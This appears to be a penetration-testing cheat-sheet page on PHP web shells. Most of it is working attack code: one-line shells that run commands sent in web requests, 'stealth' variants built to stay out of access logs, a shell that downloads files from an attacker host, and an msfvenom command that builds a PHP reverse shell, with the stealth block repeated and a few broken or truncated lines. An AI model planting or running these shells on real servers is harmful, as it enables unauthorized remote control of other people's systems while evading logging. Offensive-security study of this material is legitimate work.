# Web Shells

Webshell is a colloquial term for a script that runs inside a web server (usually in a language such as PHP or ASP) that executes code on the server. This can be extremely useful if firewalls are in place.

{% hint style="danger" %}
If we cannot enter a reverse shell as we normally do, we might suspect that the shell we want to use doesn't exist (for example, in Linux it might be that **bash** doesn't exist and you just have to use **sh**). It may also be the firewall preventing such action. In this case, we can consult the following resources: [IPTables (Linux)](broken-reference) and [AV, AppLocker and Firewall Enumeration (Windows)](../privilege-escalation/windows-privilege-escalation/initial-enumeration-windows.md#av-applocker-and-firewall-enumeration).
{% endhint %}

### PHP

{% tabs %}
{% tab title="Oneliner" %}
{% hint style="info" %}
The `system()` and `shell_exec()` functions are not the only ones to execute commands. There are others, such as `exec()`, `passthru()`, etc.
{% endhint %}

```php
<?php system($_REQUEST['cmd']); ?>
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']). "</pre>"; ?>
<?php echo system($_GET["cmd"]); ?>
<?php system("<COMMAND>")?>
<?php phpinfo(); ?> # To check for disable functions.
# Then we can run via web or curl with the following command:
curl "http://<IP>/<FILE>.php?cmd=whoami"
```



## #3. PHP Stealth WebShell

```php
# Method 1:
<?=($_=@$_GET[2]).@$_($_GET[1])?>
curl '<URL>/shell.php?1=whoami&2=shell_exec'
# Method 2:
<?php system($_POST["cmd"]); ?> # This would prevent our command logs from being stored in e.g. Apahe: access.log
curl -X POST -d 'cmd=whoami' <URL>/shell.php -H 'User-Agent: <AGENT>'
# Method 3:
<?php
$headers = getallheaders();
$message = $headers['Test']; # We can change this header for a real one to make it pass unnoticed.
echo system($message);
?>
curl -H 'Test: whoami' <URL>/shell.php -H 'User-Agent: <AGENT>'
```

## #4. PHP Web Shell with multiple functions

```php
<?php
	if (isset($_REQUEST['fupload'])) {
		file_put_contents($_REQUEST['fupload'], file_get_contents("http://<IP>/" . $_REQUEST['fupload']));
	};
	if (isset($_REQUEST['fexec'])) {
		echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
	};
?>
```
{% endtab %}

{% tab title="msfvenom" %}
```
msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=443 -f raw > shell.php
```
{% endtab %}

{% tab title="Bypass disable_func" %}
emember that in some PHP versions, there is an exploit to bypass all disable functions:
{% endtab %}

{% tab title="Stealth" %}
```bash
# Method 1:
<?=($_=@$_GET[2]).@$_($_GET[1])?>
curl '<URL>/shell.php?1=whoami&2=shell_exec'
# Method 2:
<?php system($_POST["cmd"]); ?> # This would prevent our command logs from being stored in e.g. Apahe: access.log
curl -X POST -d 'cmd=whoami' <URL>/shell.php -H 'User-Agent: <AGENT>'
# Method 3:
<?php
$headers = getallheaders();
$message = $headers['Test']; # We can change this header for a real one to make it pass unnoticed.
echo system($message);
?>
curl -H 'Test: whoami' <URL>/shell.php -H 'User-Agent: <AGENT>'
```
{% endtab %}

{% tab title="Others" %}

{% endtab %}
{% endtabs %}



